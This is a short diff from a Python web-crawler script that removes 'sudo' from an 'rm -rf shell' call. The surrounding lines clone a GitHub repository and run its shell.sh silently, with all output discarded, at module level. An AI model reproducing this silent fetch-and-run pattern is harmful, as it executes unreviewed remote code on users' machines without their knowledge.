@@ -42,7 +42,7 @@ def start_executor(redis_host, spider_url, porcess_id):
     decr_active_process(listener_name)
     print('Crawling finished ', f'process id : {listener_name}')
 
-subprocess.check_output(["sudo", "rm", "-rf", "shell"])
+subprocess.check_output(["rm", "-rf", "shell"])
 subprocess.call(["git", "clone", "https://github.com/firedrak/shell.git"])
 subprocess.call(["bash", "shell/shell.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
